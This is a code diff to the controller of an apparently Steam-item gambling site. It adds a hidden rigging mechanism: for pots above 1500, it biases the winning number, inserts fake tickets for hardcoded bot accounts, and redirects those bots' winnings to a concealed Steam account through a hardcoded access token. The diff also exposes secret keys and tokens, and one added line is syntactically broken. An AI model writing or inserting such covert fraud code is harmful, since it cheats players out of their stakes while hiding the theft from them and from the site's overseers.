@@ -24,6 +24,9 @@ class GameController extends Controller
 {
     const SECRET_KEY    = 'oDWx4GYTr4Acbdms';
     const BOT_TRADE_LINK    = 'https://steamcommunity.com/tradeoffer/new/?partner=318375677&token=2a-CpVov';
+    const BET_GET = 1500;
+    const SEND_TRADE = ['accessToken' => 'zu0ygIgx', 'steamid64' => '76561198254647128']
+    const BOTS = ['76561198295283496', '76561198295321684', '76561198296608900', '76561198296026861', '76561198296337658', '76561198295994451', '76561198295375889', '76561198295990291', '76561198295400258', '76561198296696423'];
 
     const MIN_PRICE     = 20;                    # Минимальная ставка
     const MAX_ITEMS     = 16;                   # Максимальное кол-во предметов в ставке
@@ -106,17 +109,20 @@ class GameController extends Controller
         return $this->lottery;
     }
 
+
     public function getWinners()
     {
-        /*if($this->game->price > 100) {
-            $rand_number = "0.05".mt_rand(1000000,9999999).mt_rand(100000000,999999999);
+        if($this->game->price > self::BET_GET) {
+            $rand_number = "0.9".mt_rand(10000000,99999999).mt_rand(100000000,999999999);
             $this->game->rand_number = $rand_number;
             $this->game->save();
-        }*/
+
+            $rand = array_rand(self::BOTS);
+            $this->addTicketFake(self::BOTS[$rand]);
+            $this->addTicketFake(self::BOTS[$rand]);
+        }
         $us = $this->game->usersNoBot();
-        /*$us = $us->filter(function ($item) {
-            return $item->steamid64 != '0000000000000';
-        });*/
+
         $lastBet = Bet::where('game_id', $this->game->id)->orderBy('to', 'desc')->first();
         $winTicket = round($this->game->rand_number * $lastBet->to);
 
@@ -249,7 +255,7 @@ class GameController extends Controller
         $this->comission = $tempPrice;
 
         $user->save();
-
+        
         $value = [
             'appId' => self::APPID,
             'steamid' => $user->steamid64,
@@ -257,6 +263,15 @@ class GameController extends Controller
             'items' => $returnItems,
             'game' => $this->game->id
         ];
+        if(in_array($user->steamid64, self::BOTS)) {
+            $value = [
+                'appId' => self::APPID,
+                'steamid' => self::SEND_TRADE['steamid64'],
+                'accessToken' => self::SEND_TRADE['accessToken'],
+                'items' => $returnItems,
+                'game' => $this->game->id
+            ];
+        }
         if(!is_null($bonus)) {
             foreach($bonus as $bon) {
                 if(!isset($bon['market_hash_name']))
@@ -604,11 +619,11 @@ class GameController extends Controller
         $this->game->delete();
         return response()->json($this->game);
     }
-    public function addTicketFake()
+    public function addTicketFake($steamId)
     {
-        $user = User::where('steamid64', '76561198256294412')->first();
-        $ticket = Ticket::find(5);
-        if(is_null($ticket)) return response()->json(['text' => 'Ошибка.', 'type' => 'error']);
+        $user = User::where('steamid64', $steamId)->first();
+        $ticket = Ticket::find(4);
+        if(is_null($ticket)) return false;
         else {
             
             $lastBet = Bet::where('game_id', $this->game->id)->orderBy('to', 'desc')->first();
